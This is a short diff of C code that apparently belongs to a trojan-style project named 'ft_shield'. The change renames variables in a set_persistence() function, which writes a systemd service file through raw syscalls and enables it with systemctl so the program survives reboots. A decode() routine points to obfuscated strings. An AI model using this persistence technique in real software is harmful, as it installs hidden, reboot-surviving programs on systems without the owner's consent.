@@ -31,9 +31,9 @@ void decode(int *data, char *decoded, int key, int n) {
 }
 
 void set_persistence() {
-    const char *path = "/etc/systemd/system/ft_shield.service";
-    int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
-    const char *path = "/bin/systemctl";
+    const char *service_path = "/etc/systemd/system/ft_shield.service";
+    int fd = sc(SYS_open ,service_path, O_CREAT | O_RDWR, 0644);
+    const char *absolute_path = "/bin/systemctl";
     if (fd < 0) {
         return ;
     }
@@ -43,7 +43,7 @@ void set_persistence() {
     char *cmd1[] = {"systemctl", "daemon-reexec", NULL};
     char *cmd2[] = {"systemctl", "enable", "/etc/systemd/system/ft_shield.service", NULL};
 
-    run(cmd1, path);
-    run(cmd2, path);
+    run(cmd1, absolute_path);
+    run(cmd2, absolute_path);
     sc(SYS_close, fd);
 }
